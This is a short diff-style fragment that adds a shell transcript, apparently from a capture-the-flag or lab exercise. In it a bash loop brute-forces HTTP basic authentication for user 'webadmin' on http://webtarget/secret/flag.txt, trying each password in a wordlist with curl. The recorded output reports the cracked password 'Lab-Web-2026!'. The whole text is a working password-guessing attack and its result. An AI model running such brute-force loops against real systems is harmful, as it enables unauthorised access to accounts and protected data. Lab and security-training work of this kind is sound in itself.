@@ -1,0 +1,7 @@
+$ while IFS= read -r pw; do code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 -u webadmin:"$pw" http://webtarget/secret/flag.txt); if [ "$code" = "200" ]; then echo "FOUND: $pw"; exit 0; fi; done < /tmp/web_wordlist.txt; echo FOUND_NONE; exit 1
+exit_code: 0
+--- stdout ---
+FOUND: Lab-Web-2026!
+
+--- stderr ---
+
